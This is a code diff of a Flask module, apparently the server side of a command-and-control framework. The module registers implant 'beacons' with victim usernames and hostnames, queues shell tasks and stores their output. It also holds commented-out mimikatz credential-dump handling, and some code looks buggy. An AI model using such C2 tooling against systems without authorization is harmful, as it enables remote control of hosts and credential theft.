@@ -1,9 +1,10 @@
 from flask import request
-from app.models import StartupTasks
+from app.models import StartupTasks, Tasks
 from app.validators import Existance
-from app.operations import Beacon
+from app.operations import Beacon, Result, Task
 from app.functions_generic import Generic
-import magic, base64, os
+import magic, base64, os, datetime, json
+from io import StringIO
 
 class Pulse:
     def process(post_data, remote_ip, channel='http'):
@@ -11,54 +12,44 @@ class Pulse:
         if verify_beacon['result'] == "failed":
             save_first_beacon = Process.first_beacon(post_data, remote_ip)
 
-        if post_data['tasks'] is not None:
-            task_results = post_data['tasks']
-            Process.task(task_results, post_data['beacon_id'], post_data, remote_ip)
-
         if post_data['timer'] is not None:
-            print(post_data)
             new_timer = float(post_data['timer'])
-            Beacon.change_timer(post_data['beacon_id'], new_timer)
+            Result.change_timer(post_data['beacon_id'], new_timer)
 
         process_message = Process.pulse(post_data, remote_ip)
-        available_tasks = Existance.tasks(post_data['beacon_id'], post_data, remote_ip)
-        return available_tasks
+        get_tasks = Tasks.objects(beacon_id=post_data['beacon_id'], task_status="Open").only('id', 'commands')
+        result = json.loads(get_tasks.to_json())
+        return result
 
 
 class Process:
     def pulse(post_data, remote_ip):
         create_history = Beacon.pulse(post_data['beacon_id'], post_data['platform'],
-            post_data['username'], post_data['hostname'], post_data['data'], remote_ip)
+            post_data['username'], post_data['hostname'], post_data['data'], post_data['working_dir'],
+            remote_ip)
         return create_history
 
     def first_beacon(post_data, remote_ip):
         create_beacon = Beacon.create(post_data['beacon_id'], post_data['platform'],
             post_data['username'], post_data['timer'], post_data['hostname'], 
-            post_data['data'], remote_ip)
+            post_data['data'], post_data['working_dir'], remote_ip)
 
         startup_tasks = StartupTasks.objects(platform=post_data['platform'])
         for tasks in startup_tasks:
             task_id = Generic.create_random(10)
             create_tasks = Tasks.create(beacon_id, tasks.command.name, tasks.input, task_id)
                         
-    def task(task_result, beacon_id, post_data, remote_ip):
-        for taskResult in taskResults:
-            task_id = task_result['task_id']
-            task_res = task_result['output']
-            task_res = base64.b64decode(task_res)
+    def task(beacon_id, task_id, command, output):
+        result = Existance.task(beacon_id, task_id)
+        if result["result"] == "success":
+            decoded_output = base64.b64decode(output)
             task_enddate = datetime.datetime.now()
-
-            le_magic = magic.Magic(mime=True)
-            le_magic_type = le_magic.from_buffer(task_res)
-            task_ref = Tasks.objects.get(task_id=task_id)
-            task_ref.update(set__taskStatus="Processed")
-
-            if task_ref.name == 'exec_shell':
-                le_magic_type = "text/plain"
-
-            save_task = addTaskResultOperation(beacon_id, task_d, task_enddate, task_res, le_magic_type)
-            if 'mimikatz(powershell)' in task_res:
-                self.mimikatz(beacon_id, task_res, post_data)
+            magic_object = magic.Magic(mime=True)
+            magic_type = "text/plain" if command == "exec_shell" else magic_object.from_buffer(decoded_output)
+            result = Result.store_result(beacon_id, task_id, command, decoded_output, magic_type)
+            # if 'mimikatz(powershell)' in task_res:
+            #     self.mimikatz(beacon_id, task_res, post_data)
+        return result
 
 
     def mimikatz(beacon_id, task_res, post_data):
